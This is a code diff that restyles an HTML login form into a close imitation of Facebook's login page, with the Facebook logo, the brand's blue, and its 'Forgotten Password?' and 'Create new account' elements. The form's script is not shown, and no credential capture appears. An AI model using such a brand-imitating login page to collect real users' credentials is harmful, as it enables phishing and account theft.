@@ -13,6 +13,7 @@
             display: flex;
             flex-direction: column;
             justify-content: center;
+            align-items: center;
             height: 100vh;
         }
 
@@ -22,7 +23,19 @@
             align-items: center;
             width: 100%;
             max-width: 400px;
-            margin: 0 auto;
+            background: #ffffff;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .logo-container {
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 80px;
         }
 
         .input-field {
@@ -45,16 +58,50 @@
             font-size: 17px;
             cursor: pointer;
             margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #155db2;
+        }
+
+        .forgot-password {
+            margin-top: 20px;
+            font-size: 15px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .create-account-btn {
+            margin-top: 40px;
+            padding: 12px 0;
+            width: 90%;
+            border: 1px solid #1877f2;
+            color: #1877f2;
+            border-radius: 20px;
+            background-color: transparent;
+            font-size: 17px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .create-account-btn:hover {
+            background-color: #e7f3ff;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
+        </div>
         <form id="loginForm">
             <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" required>
             <input type="password" id="password" class="input-field" placeholder="Password" required>
             <button type="submit" class="login-btn">Log In</button>
         </form>
+        <a href="#" class="forgot-password">Forgotten Password?</a>
+        <button class="create-account-btn">Create new account</button>
     </div>
 
     <script>
